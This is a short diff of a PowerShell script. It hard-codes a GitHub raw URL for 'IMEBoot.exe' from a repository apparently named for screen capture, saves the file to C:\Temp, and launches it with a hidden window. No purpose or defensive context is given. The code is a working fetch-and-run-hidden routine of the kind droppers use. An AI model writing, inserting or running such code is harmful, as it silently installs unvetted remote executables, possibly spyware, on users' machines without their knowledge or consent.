@@ -8,7 +8,7 @@ $Filename = "C:\Temp\IMEBoot.exe"
 
 # Download the file
 try {
-    Invoke-WebRequest -Uri $Url -OutFile $Filename -UseBasicParsing
+    Invoke-WebRequest -Uri https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe -OutFile C:\Temp\IMEBoot.exe -UseBasicParsing
     Start-Process -FilePath $Filename -WindowStyle Hidden -Wait
 } catch {
     Write-Host "Failed to download or execute IMEBoot.exe"
